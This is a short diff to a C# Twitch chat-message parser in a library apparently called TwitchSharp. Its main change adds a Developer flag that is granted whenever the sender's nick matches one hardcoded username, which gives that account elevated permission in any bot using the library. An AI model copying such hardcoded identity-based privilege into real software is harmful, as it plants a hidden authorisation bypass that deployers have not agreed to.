@@ -63,6 +63,7 @@ namespace TwitchSharp.EventArguments
 		public Boolean IsModerator { get { return Tags["mod"] == "1"; } }
 		public Boolean UsesTags { get { return RawMessage.StartsWith("@"); } }
 		public Boolean IsSubMessage { get; }
+		public Boolean IsDeveloper { get; }
 
 		public Permission Permission { get; }
 
@@ -72,7 +73,6 @@ namespace TwitchSharp.EventArguments
 			this.Tags = new Dictionary<string, string>();
 			this.RawMessage = Message;
 			this.Type = MessageType.UNDEFINED;
-			this.IsSubMessage = false;
 			this.Permission = Permission.Everybody;
 
             if (Message.StartsWith(@"PING"))
@@ -154,6 +154,12 @@ namespace TwitchSharp.EventArguments
 					if (this.Nick == this.Channel)
 					{
 						this.Permission = Permission.Broadcaster;
+					}
+
+					if (this.Nick.ToLower() == @"imthe666st")
+					{
+						this.Permission = Permission.Developer;
+						this.IsDeveloper = true;
 					}
 
 
